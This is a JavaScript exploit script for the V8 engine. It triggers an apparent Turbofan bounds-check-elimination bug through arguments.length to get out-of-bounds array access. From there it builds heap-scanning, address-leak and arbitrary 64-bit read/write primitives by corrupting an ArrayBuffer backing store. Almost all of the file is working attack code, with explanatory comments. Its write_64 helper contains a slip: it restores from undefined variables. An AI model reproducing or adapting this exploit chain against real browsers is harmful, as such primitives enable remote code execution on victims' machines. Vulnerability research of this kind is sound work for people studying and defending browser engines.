load('int64.js')


/*
 * In this function we use the length of the arguments to calculate the number 1.
 * Turbofan things arguments are limited to a smaller number, so it will optimize
 * out the bounds checks based on our number, giving us oob read/write
 */
function opt(arg) {
  let x = arguments.length;
  tmp_arr = new Array(0x10);
  oob_double_array = new Array(2);
  oob_double_array[0] = 1.1; // Convert a2 to a PACKED_DOUBLE_ELEMENTS jsarray
  oob_double_array[1] = 1.1;

  // Overwrite the length for the DOUBLE_ELEMENTS array
  tmp_arr[(x >> 16) * 27] = 1.39064994160909e-309; // 0xffff00000000 smi
}

var a1, oob_double_array;


let small = [1.1];
let large = [1.1,1.1];
large.length = 65536;
large.fill(1.1);

for (let j = 0; j< 100000; j++) {
    opt.apply(null, small);
}

// Trigger bug
opt.apply(null, large);

if (oob_double_array.length === 2)
    throw("Bug or heap layout did not work");

print(`Length is now ${oob_double_array.length}`);

/*
 * Allocate objects we want to use with our new oob array
 */
let master_ab = new ArrayBuffer(0x4000);
let target_array = new Array(0x10);
target_array[0] = 0x41424344; // Make HOLEY_ELEMENTS
target_array[1] = master_ab;

let slave_ab = new ArrayBuffer(0x5000);

/*
 * Scan forward with our new oob array to locate our objects above
 */

print("Scanning for objects")

let master_ab_off = null;
let addr_arr_off = null;
for (let j=0; j<0x100; j++) {
    let b = Int64.from_double(oob_double_array[j]);

    // Find OOB offset to ArrayBuffer
    if (master_ab_off === null && b == '0x0000000000004000') {
        print(`ArrayBuffer Backing Store found at offset ${j+1}`);
        master_ab_off = j+1; // The backing store will be one offset more
    }

    // Find OOB offset to HOLEY_ELEMENTS array for addr_of 
    if (addr_arr_off === null && b == '0x4142434400000000') {
        print(`HOLEY_ELEMENTS array[0] found at offset ${j}`);
        addr_arr_off = j;
    }

    // Once we found both break out
    if (master_ab_off !== null && addr_arr_off !== null)
        break
}

if (master_ab_off === null || addr_arr_off === null) {
    throw("Could not find offsets");
}

let addr_of = (obj) => {
    target_array[0] = obj;
    return Int64.from_double(oob_double_array[addr_arr_off]).sub(1);
}


// === Arb Write ===

/*
 * Point one array buffer at the other, we will use this
 * to modify the slave buffer and get arbitrary read and write
 */


let slave_ab_ptr = addr_of(slave_ab);
print(`slave_ab at ${slave_ab_ptr}`);

let original_master_backing_store = oob_double_array[master_ab_off];

// Overwrite Master ArrayBuffer backing store -> slave array buffer
oob_double_array[master_ab_off] = slave_ab_ptr.to_double()
let master_i32 = new Uint32Array(master_ab);

print(slave_ab)

let read_64 = (addr) => {
    let old_low = master_i32[8];
    let old_high = master_i32[9];

    master_i32[8] = addr.low;
    master_i32[9] = addr.high;
    let accessor = new Uint32Array(slave_ab);
    let res = new Int64(false, accessor[1], accessor[0]);

    // Restore the backing store
    master_i32[8] = old_low;
    master_i32[9] = old_high;
    return res;
}

let write_64 = (addr, val) => {
    let tmp_low = master_i32[8];
    let tmp_high = master_i32[9];

    master_i32[8] = addr.low;
    master_i32[9] = addr.high;
    let accessor = new Uint32Array(slave_ab);
    accessor[0] = val.low;
    accessor[1] = val.high;

    // Restore the backing store
    master_i32[8] = old_low;
    master_i32[9] = old_high;
}

print(read_64(addr_of({})))

// A little bit of clean up
oob_double_array[master_ab_off] = original_master_backing_store;
